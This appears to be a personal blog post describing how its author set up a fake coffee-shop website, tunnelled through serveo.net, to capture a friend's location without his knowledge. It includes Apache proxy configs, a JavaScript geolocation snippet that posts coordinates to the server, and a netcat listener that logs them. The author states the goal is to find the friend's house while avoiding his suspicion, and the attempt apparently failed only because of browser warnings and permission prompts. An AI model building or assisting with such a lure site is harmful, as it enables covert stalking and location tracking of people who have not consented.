---
title: Location tracking using a website
date: 2026-10-25
tags: ["hacking", "js", "tracking"]
---

In toady's blog i am going to talk about my experience setting my a fake website to see how easily i can access the location of an user visiting my site.

I found an simple website of an coffee shop website to use as an the fake website

Website : [coffee](https://github.com/eaznexora/Coffee-Blend/)

>NOTE: This website should note be used for commercial purposes even though it's source code is public

![restriction](/images/location/res.png)

I choose this project specifically because it was lightweight and simple enough with no backend database problems, just plain js css and html with a bit of scss

Initially everything was smooth sailing just git clonning everything and i was having a great day...

Until i started to configure stuff in apache

## Conf errors
```
<VirtualHost *:80>
    ServerAdmin webmaster@exdfs.com
    ServerName coffee.com
    ServerAlias coffee.com
    DocumentRoot /var/www/coffee.com

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

This is how my first conf file looked like, it was just a basic copy pasted from the internet

But it turn out that the `ServerName` i set to coffee.com turned out to be a problem

I thought that when i type `coffee.com` in the search bar i thought that it would connect to my localhost but in order to do that is needed to configure `/etc/hosts` instead of the conf file of my site... oops!

Eventually i figured out the problem and changed the `ServerName` to `localhost`

In the above code snippet eagle eyed viewer and frequent sys admins handling apache server could see that i forget a directory to add in `DocumentRoot`.

I wrote `/var/www/coffee.com` instead of `/var/www/html/coffee.com`, this was a minor issue easy fix.

I have an friend whose location i wanted to track for personal reasons, the coding using the geolocation api was an easy task but configuring the webpage to return data to my computer was an hard task.

Due to personal reasons i can't enable port forwarding on my router, i thought about tailscale but the idea of forcing my friend to install software was not acceptable as i didn't want to make him suspicious.

I eventually setteled on [serveo.net](https://serveo.net/) port forwarding technique to expose my website to the internet, their free tiers offer to do it but the client's can see a warning that says do not enter passwords and personal information etc and their free sessions have an time limit which was more than enough for me.

I first thought about an js file which would send the location data to the serveo server but that would cause some sop (same orgin policy) issues.

I opted to use proxypass which is already in-built in apache2 and just needs activation, the main benefits is that i can simply add an line to my site conf

```
<VirtualHost *:8096>
    ServerName localhost
    DocumentRoot /var/www/html/coffee.com
    ProxyPass /location http://127.0.0.1:8080/location

    ErrorLog ${APACHE_LOG_DIR}/error.log
    CustomLog ${APACHE_LOG_DIR}/access.log combined
</VirtualHost>
```

>NOTE: I changed the port from 80 to 8096 due to firewall configs.

With proxypass i can simply forward the location data to an backend application situated at 8080, but we have no backend so as an temporary solution i used netcat as an listner and print the output to stdout.


```
pranav@server:~$ nc -lknp 8080
POST /location HTTP/1.1
Host: 127.0.0.1:8080
User-Agent: xxxxxxxx xxxxx xxxxxx xxxx xxxxxxx xxxxxxxx xxxxxxxxxx xxxxxxxxxxx
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: http://localhost:8096/
Content-Type: application/json
Origin: http://localhost:8096
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=4
X-Forwarded-For: 127.0.0.1
X-Forwarded-Host: localhost:8096
X-Forwarded-Server: localhost
Content-Length: 64
Connection: Keep-Alive

{"lat":xxxxxxxx,"lon":xxxxxx,"accuracy":xxxxxxxxxxxx}
```

We can see that the listener gets an `POST` request from apache with json data of latitude and longitude along with accuracy

Here we use netcat with the options `-lknp`,
* `-l` is for netcat to listen for incoming connections
* `-k` is for netcat to instead of its default behaviour of closing the program after receiving one connection, keep it open for multiple connection (useful when developing/testing)
* `-n` is for NOT to reverse dns lookup the ip address, its makes the program go faster
* `-p` here specifies the port to be used (8080)

```js
if ('geolocation' in navigator) {
  navigator.geolocation.getCurrentPosition(
    ({ coords }) => {
      fetch('/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          lat: coords.latitude,
          lon: coords.longitude,
          accuracy: coords.accuracy,
        }),
      }).catch((e) => console.warn('Could not send location:', e));
    },
    (err) => console.warn('Location not shared:', err.message),
    { timeout: 10000 }
  );
}
```

Here is the js snippet for location tracking if anyone was wondering

## Limitation

Now that you have understood how basically what my thought process and ideas was but it won't work because of 3 reasons

## Reason 1: Warning

![warning](/images/location/warning.png)

My friend got scared by the above warning screen thinking this was a dangerous website (╥﹏╥)

## Reason 2: Location

In order for the browser to prompt share location the actual gps/location needs to be active in that mobile, i think this would have been an simple fix but i decided that it was not worth it.

## Reason 3: The prompt

In most browser before sharing the location data it asks the user which most people would deny including my friend (He ain't stupid) so this probably wouldn't have worked in the first place

I would like to meantion that modern browsers would not allow an site to ask for location data if it was using http which mine was, but since i basically was using serveo as port forwarding the browsers only saw the https of serveo automaticallu reducing my work.

I hope you liked by failed attempt at trying to find my friend's house.

Thank you and have a nice day.

## See also

- [My projects](/projects) — tools I have built
- [Experience](/experience) — my background
